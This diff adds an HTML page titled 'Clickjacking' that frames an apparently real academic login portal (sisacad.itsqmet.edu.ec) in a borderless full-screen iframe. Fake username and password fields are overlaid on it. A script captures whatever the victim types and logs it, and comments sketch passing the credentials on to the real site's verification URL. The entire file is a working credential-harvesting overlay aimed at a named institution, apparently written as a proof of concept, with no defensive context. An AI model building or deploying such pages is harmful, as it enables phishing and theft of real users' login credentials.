@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Clickjacking</title>
+  </head>
+  <body style="margin: 0; padding: 0">
+    <div
+      style="position: relative; height: 100vh; width: 100vw"
+      style="margin: 0; padding: 0"
+    >
+      <iframe
+        src="http://sisacad.itsqmet.edu.ec/"
+        width="100%"
+        height="100%"
+        allow="fullscreen"
+        style="margin: 0; padding: 0; border: none"
+        align="right"
+        id="iframe"
+        scrolling="no"
+      >
+      </iframe>
+      <div style="position: absolute; top: 300px; left: 600px">
+        <input type="text" id="txtUser" />
+      </div>
+
+      <div style="position: absolute; top: 300px; left: 775px">
+        <input type="password" id="txtPassword" />
+      </div>
+
+      <div style="position: absolute; top: 380px; left: 735px">
+        <input
+          type="button"
+          id="send-button"
+          value="Ingresar"
+          onclick="capturarD()"
+        />
+      </div>
+    </div>
+
+    <script>
+      const iframe = document.getElementById("iframe");
+      const userInput = document.getElementById("txtUser");
+      const passwordInput = document.getElementById("txtPassword");
+      const sendButton = document.getElementById("send-button");
+
+      const capturarD = () => {
+        let us = document.getElementById("txtUser").value;
+        let pass = document.getElementById("txtPassword").value;
+
+        console.log(us, pass);
+        // dirigir a la página oficial
+        // single sign on
+        // sisacad.itsqmet.edu.ec/VerificarUsuario.aspx?txtU=us&txtP=pass
+      };
+
+      iframe.addEventListener("scroll", () => {
+        console.log("hello");
+      });
+    </script>
+  </body>
+</html>
